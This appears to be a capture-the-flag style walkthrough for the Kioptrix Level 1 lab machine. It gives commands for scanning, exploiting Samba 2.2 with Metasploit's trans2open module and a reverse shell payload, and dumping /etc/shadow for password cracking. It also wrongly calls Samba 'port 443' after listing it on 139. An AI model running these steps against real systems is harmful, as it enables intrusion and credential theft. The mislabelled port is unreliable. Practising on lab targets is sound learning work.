# Objective

To gain root access to the system.

---

## Stage 1: Identifying All Possible Exploits

### Step 1: Identifying the Compromised System on the Network
- **Command:**
  ```bash
  sudo netdiscover -P -r <IP>
  ```

---

### Step 2: Running a Port Scan
- **Command:**
  ```bash
  sudo nmap -A -T4 -p- <Target_IP>
  ```
- **Findings:**
  - Multiple open ports and their services:
    - **Port 22:** SSH
    - **Port 80:** Apache 1.3 File server
    - **Port 139:** Samba
    - **Port 443:** OpenSSL

---

### Step 3: Identifying Vulnerabilities on Port 80
- **Command:**
  ```bash
  nikto -port 80 -host <Target_IP>
  ```

---

## Stage 2: Exploiting Identified Vulnerabilities

### Step 1: Targeting Samba on Port 443 with Metasploit
- **Actions:**
  - Identify Samba version
  - Search for relevant exploit in Metasploit
- **Commands:**
  ```bash
  msfconsole
  search smb_version
  # Set up rhosts and port, then run
  ```
- **Findings:**
  - Samba version identified as 2.2.1a

---

### Step 2: Looking Up Exploits for Samba 2.2
- **Command:**
  ```bash
  search samba 2.2
  ```
- **Findings:**
  - Use `exploit/linux/samba/trans2open`

---

### Step 3: Setting Up a Reverse Shell Payload
- **Note:**
  - A reverse shell (connect-back) requires the attacker to set up a listener. The target connects back, giving the attacker a shell.
- **Commands:**
  ```bash
  use exploit/linux/samba/trans2open
  set rhosts <Target_IP>
  set payload linux/x86/shell_reverse_tcp
  run
  ```

---

## Stage 3: Gaining Root Access

### Step 1: Verifying Access Level
- **Action:**
  - Enumerate the system to confirm access level

---

### Step 2: Performing Enumeration
- **Commands:**
  ```bash
  whoami      # Find the current user
  id          # Check account's access level (0 = root)
  sudo -l     # List commands that can be run as root
  ```
- **Findings:**
  - Root access obtained; unrestricted access to system files.

---

### Step 3: Post-Exploitation - Credential Extraction
- **Actions:**
  - Extract credentials/encrypted passwords from `/etc/shadow`
  - Extract user details from `/etc/passwd`
  - Identify password encryption type and use tools like Hashcat for attacks
- **Commands:**
  ```bash
  cat /etc/shadow
  cat /etc/passwd
  ```

---

## References
- [Kioptrix Level 1 Walkthrough - Exploiting Apache mod_ssl Privilege Escalation](https://medium.com/@cipher0x00/kioptrix-level-1-walkthrough-exploiting-apache-mod-ssl-privilege-escalation-66bba328b349)
- [How to Use a Reverse Shell in Metasploit](https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
- [OpenLuck Exploit](https://github.com/heltonWernik/OpenLuck)
